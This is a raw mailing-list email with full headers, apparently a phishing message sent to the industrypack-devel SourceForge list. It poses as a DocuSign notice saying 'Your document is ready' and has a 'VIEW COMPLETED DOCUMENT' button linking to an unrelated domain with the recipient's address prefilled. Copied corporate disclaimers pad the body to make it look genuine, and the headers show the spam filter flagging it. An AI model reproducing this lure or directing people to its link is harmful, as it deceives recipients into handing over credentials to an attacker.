Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B8BA7958DB9
	for <lists+industrypack-devel@lfdr.de>; Tue, 20 Aug 2024 20:02:07 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sgTBF-0002dI-Gj
	for lists+industrypack-devel@lfdr.de;
	Tue, 20 Aug 2024 18:02:06 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <kuwabara1@purple.plala.or.jp>) id 1sgTBE-0002dC-2h
 for industrypack-devel@lists.sourceforge.net;
 Tue, 20 Aug 2024 18:02:04 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=ku9F5Qb8knVEO2/BY+A0vsLnzJcYkuVB9wUVPTnOSMw=; b=IFCIWK+8f7nzvXKe1fES8sp07t
 d91ShmaaC7WuNhH/uLD0/DSczamOHCi44Yj+isYvBAX6TgRVnqJaruiRd1aRfpAsvSthcr/sDQHs3
 AVjh/IiCL8msorzML7bijMMozwgRnp0qykumSTkoGe2PV6LkWkoMbEz9b0Qo9jRazFt4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=ku9F5Qb8knVEO2/BY+A0vsLnzJcYkuVB9wUVPTnOSMw=; b=E
 YiX7ztVAIsjfnMYu6XKCau3Bkroi+s2o+R7MGRWFGS/QjrhuxyqpC43ZDtAK6mPzECqG70XwQpvYQ
 0uNSF5IKgn311Eif2Fnb/ygR4EoDUaZeg2Cc+wPTKmBZdmsQ3mizAOtCdddx0pDzGqMl41AQ78lKe
 dmXE2wAhKj0SyPek=;
Received: from s931609.srvape.com ([188.127.227.208])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1sgTBD-000751-9Y for industrypack-devel@lists.sourceforge.net;
 Tue, 20 Aug 2024 18:02:04 +0000
Received: from purple.plala.or.jp (localhost [IPv6:::1])
 by s931609.srvape.com (Postfix) with ESMTP id 6CF612BAC95
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 20 Aug 2024 17:41:26 +0300 (MSK)
From: DocuSign<kuwabara1@purple.plala.or.jp>
To: industrypack-devel@lists.sourceforge.net
Date: 20 Aug 2024 07:41:26 -0700
Message-ID: <20240820074126.E9B4F200ED4E4D2F@purple.plala.or.jp>
MIME-Version: 1.0
X-Spam-Score: 7.2 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Your document is ready VIEW COMPLETED DOCUMENT DISCLAIMER:
 The contents of this email and any file(s) attached are strictly confidential
 and are intended solely for the addressee. It may contain information and/or
 attachments that are privileged, [...] 
 Content analysis details:   (7.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: abpphkv.com]
 0.1 INVESTMENT_ADVICE      BODY: Message mentions investment advice
 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
 blocklist [URIs: abpphkv.com]
 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
 [URIs: abpphkv.com]
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [188.127.227.208 listed in sa-accredit.habeas.com]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [188.127.227.208 listed in bl.score.senderscore.com]
 0.3 RCVD_IN_MSPIKE_L3      RBL: Low reputation (-3)
 [188.127.227.208 listed in bl.mailspike.net]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [188.127.227.208 listed in list.dnswl.org]
 0.2 FREEMAIL_REPLYTO_END_DIGIT Reply-To freemail username ends in
 digit [macsteve122[at]gmail.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 1.1 DATE_IN_PAST_03_06     Date: is 3 to 6 hours before Received: date
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 2.5 FREEMAIL_FORGED_REPLYTO Freemail in Reply-To, but not From
X-Headers-End: 1sgTBD-000751-9Y
Subject: [Industrypack-devel] Please review Document for industrypack-devel
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: macsteve122@gmail.com
Content-Type: multipart/mixed; boundary="===============5148323950238512228=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5148323950238512228==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>

<HTML><HEAD><TITLE></TITLE>
<META content=3D"text/html; charset=3Diso-8859-1" http-equiv=3DContent-Type=
>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19963"></HEAD>
<body>
<table cellspacing=3D"0" cellpadding=3D"0">
<TBODY>
<TR>
<td style=3D"WIDTH: 700px; BACKGROUND: rgb(247,247,247); PADDING-BOTTOM: 20=
px; PADDING-TOP: 20px; PADDING-LEFT: 20px; MARGIN: 10px; PADDING-RIGHT: 20p=
x">
<P><BR></P>
<DIV style=3D"BACKGROUND: rgb(30,76,161); COLOR: #efefef; PADDING-BOTTOM: 2=
0px; PADDING-TOP: 20px; PADDING-LEFT: 20px; PADDING-RIGHT: 20px" align=3Dce=
nter><BR>Your document is ready
<P>&nbsp;</P><A style=3D"TEXT-DECORATION: none; BORDER-TOP: #fcfcfc 1px sol=
id; BORDER-RIGHT: #fcfcfc 1px solid; BORDER-BOTTOM: #fcfcfc 1px solid; COLO=
R: white; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; BORD=
ER-LEFT: #fcfcfc 1px solid; PADDING-RIGHT: 10px; border-radius: 2px" href=
=3D"https://abpphkv.com/ath/updation/index.html#industrypack-devel@lists.so=
urceforge.net" align=3D"center">VIEW COMPLETED DOCUMENT </A>
<P>&nbsp;</P></DIV>
<P style=3D"FONT-SIZE: 10px"><BR>
DISCLAIMER: The contents of this email and any file(s) attached are strictl=
y confidential and are intended solely for the addressee. It may contain in=
formation and/or attachments that are privileged, confidential, proprietary=
 and protected from disclosure, which cannot be reproduced, transmitted, di=
sclosed, or used in whole or in part, without the written consent of any of=
 the entities of IQ-EQ group. If you are not the intended recipient, please=
 notify the sender immediately and delete this=20
email. All statements of opinion or advice presented in this email are sole=
ly those of the author and do not necessarily represent those of or are end=
orsed by the entity in the signature block. IQ-EQ group is neither liable f=
or the proper and complete transmission of the information contained in thi=
s communication nor for any delay in its receipt. This communication or any=
 attachment thereto is not intended, and should not be construed, as invest=
ment advice and does not constitute an offer or=20
commitment, a solicitation of an offer, or any advice or recommendation, to=
 enter into or conclude any transaction. This communication or any attachme=
nt thereto is not intended, and should not be construed, as legal, tax, pub=
lic accounting or auditing advice or opinions. You should consult your lega=
l counsel, accountants and/or tax advisors prior to making any decisions or=
 taking any action concerning the matters in this communication. Attachment=
s hereto may have additional important=20
disclosures and disclaimers, which you should read. When addressed to clien=
ts, any information contained in this e-mail shall be subject to the terms =
and conditions in the applicable client contract. The sender of this email =
may not be acting on its own account and may be acting as agent of another =
party. If this email relates to matters pertaining to another party, the se=
nder is sending this email in its appointed capacity for that third party. =
IRS CIRCULAR 230 NOTICE: In order to comply with=20
the requirements mandated by the IRS, we are required to advise you that an=
y Federal tax advice contained in this e-mail message, including attachment=
s to this message, is not intended or written to be used, and cannot be use=
d, for the purpose of avoiding penalties under the Internal Revenue Code or=
 promoting, marketing, or recommending to another party any transaction or =
tax-related matter addressed in this e-mail message or attachments.</P></TD=
></TR></TBODY></TABLE>
<P style=3D"FONT-SIZE: 15px; COLOR: rgb(36,36,36); BACKGROUND-COLOR: rgb(25=
5,255,255)">***************************************************************=
*******<BR><STRONG>DISCLAIMER:</STRONG><BR>'This e-mail and files transmitt=
ed with it may contain information which is private and confidential and mu=
st be handled accordingly. If you are<BR>not the intended recipient, please=
 notify the sender and delete the message and any attachments. Any views or=
 opinions presented<BR>
are solely those of the author and do not necessarily represent those of So=
lihull Council unless explicitly stated otherwise. Solihull Council may<BR>=
monitor the contents of e-mail sent and received via its network, for the p=
urposes of ensuring compliance with its policies, procedures and any<BR>leg=
al obligations. Please note if we receive a request to access information e=
=2Eg. under the Freedom of Information Act or data protection<BR>
legislation, the contents of e-mails may have to be disclosed to third part=
ies. If you would like to learn more about how the council uses<BR>informat=
ion please refer to the council&#8217;s website'</P>
<P style=3D"FONT-SIZE: 15px; COLOR: rgb(36,36,36); BACKGROUND-COLOR: rgb(25=
5,255,255)"><STRONG>Email Security</STRONG><BR>We use Transport Layer Secur=
ity (TLS) to encrypt and protect email traffic. If your mail server does no=
t support TLS, you should be aware that any emails you send to, or receive =
from us, may not be protected in transit.<BR>******************************=
****************************************</P>
<BLOCKQUOTE><BR></BLOCKQUOTE></BODY></HTML>


--===============5148323950238512228==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5148323950238512228==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5148323950238512228==--
